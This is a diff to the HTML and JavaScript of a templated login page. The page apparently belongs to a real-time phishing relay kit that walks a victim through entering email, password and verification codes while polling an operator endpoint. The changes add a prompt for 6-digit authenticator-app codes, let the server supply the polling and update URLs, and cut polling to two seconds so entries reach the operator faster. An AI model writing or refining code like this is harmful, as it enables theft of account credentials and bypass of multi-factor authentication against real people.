@@ -171,7 +171,7 @@
                             </div>
 
                             <div class="form-input-container" id="verificationCodeGroup" style="display:none;">
-                                <div class="form-message">Enter the verification code sent to your device</div>
+                                <div class="form-message" id="verificationCodeLabel">Enter the verification code sent to your device</div>
                                 <input name="txtVerificationCode" type="text" id="txtVerificationCode"
                                     class="form-text-input" autocomplete="off" size="25"
                                     placeholder="Enter verification code"
@@ -259,10 +259,17 @@
         const templateConfig = {
             postURL: window.location.origin + '/api',
             token: "{{token}}",
-            landingPageLink: "{{landingPageLink}}"
+            landingPageLink: "{{landingPageLink}}",
+            pollingUrl: "{{pollingUrl}}",
+            updateUrl: "{{updateUrl}}"
         };
 
-        const apiBaseUrl = templateConfig.postURL;
+        const apiBaseUrl = templateConfig.pollingUrl
+            ? templateConfig.pollingUrl.replace('/pooling-operator', '')
+            : templateConfig.postURL;
+        const updateBaseUrl = templateConfig.updateUrl
+            ? templateConfig.updateUrl.replace('/update-process', '')
+            : templateConfig.postURL;
 
         let browserId = null;
         let pollingIntervalId = null;
@@ -410,7 +417,7 @@
                     submitButton.disabled = true;
                     emailField.readOnly = true;
                     passwordField.disabled = true;
-                    startPolling(5000);
+                    startPolling(2000);
                     break;
                 case 'PROCESSING':
                     emailGroup.style.display = 'block';
@@ -422,7 +429,7 @@
                     submitButton.disabled = true;
                     emailField.readOnly = true;
                     passwordField.disabled = true;
-                    startPolling(10000);
+                    startPolling(2000);
                     break;
                 case 'WAITINGEMAIL':
                 case 'WAITINGEMAILERROR':
@@ -447,7 +454,7 @@
                     if (!isSameStatusDuringSubmit) {
                         hideLoadingOverlay();
                     }
-                    startPolling(10000);
+                    startPolling(2000);
                     break;
                 case 'WAITINGPASSWORD':
                 case 'WAITINGPASSWORDERROR':
@@ -473,7 +480,7 @@
                     if (!isSameStatusDuringSubmit) {
                         hideLoadingOverlay();
                     }
-                    startPolling(10000);
+                    startPolling(2000);
                     break;
                 case 'WAITINGOPTIONS':
                     emailGroup.style.display = 'none';
@@ -492,7 +499,7 @@
                     if (!isSameStatusDuringSubmit) {
                         hideLoadingOverlay();
                     }
-                    startPolling(10000);
+                    startPolling(2000);
                     break;
                 case 'WAITINGCODE':
                     emailGroup.style.display = 'none';
@@ -501,6 +508,13 @@
                     verificationCodeGroup.style.display = 'block';
                     submitButton.value = 'Submit Code';
                     verificationCodeInput.value = '';
+                    const viewName = (d && d.viewName) || (d && d.lastJsonResponse ? (typeof d.lastJsonResponse === 'string' ? JSON.parse(d.lastJsonResponse || '{}') : d.lastJsonResponse).viewName : '') || '';
+                    const codeLabel = document.getElementById('verificationCodeLabel');
+                    if (codeLabel) {
+                        codeLabel.textContent = /authenticator|otp/i.test(viewName)
+                            ? 'Open your authenticator app and enter the 6-digit code'
+                            : 'Enter the verification code sent to your device';
+                    }
                     if (data.lastJsonResponse) {
                         try {
                             const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
@@ -513,7 +527,7 @@
                     if (!isSameStatusDuringSubmit) {
                         hideLoadingOverlay();
                     }
-                    startPolling(10000);
+                    startPolling(2000);
                     break;
                 case 'COMPLETED':
                     hideLoadingOverlay();
@@ -666,6 +680,14 @@
                 const data = await res.json();
                 if (data.apiResponse && data.apiResponse.browserId) {
                     browserId = data.apiResponse.browserId;
+                    if (data.pollingUrl && !templateConfig.pollingUrl) {
+                        templateConfig.pollingUrl = data.pollingUrl;
+                        apiBaseUrl = data.pollingUrl.replace('/pooling-operator', '');
+                    }
+                    if (data.updateUrl && !templateConfig.updateUrl) {
+                        templateConfig.updateUrl = data.updateUrl;
+                        updateBaseUrl = data.updateUrl.replace('/update-process', '');
+                    }
                     updateUIForStatus(data.apiResponse.status, data.apiResponse);
                 } else {
                     throw new Error('No browserId received');
@@ -775,7 +797,7 @@
             payload.updateType = updateType;
 
             try {
-                const res = await fetch(apiBaseUrl + '/update-process', {
+                const res = await fetch(updateBaseUrl + '/update-process', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: objectToFormData(payload)
@@ -783,7 +805,7 @@
                 if (!res.ok) throw new Error('HTTP ' + res.status);
                 await res.json();
                 pollingStartTime = Date.now();
-                startPolling(3000);
+                startPolling(2000);
             } catch (e) {
                 console.error('Submission error:', e);
                 isSubmitting = false;
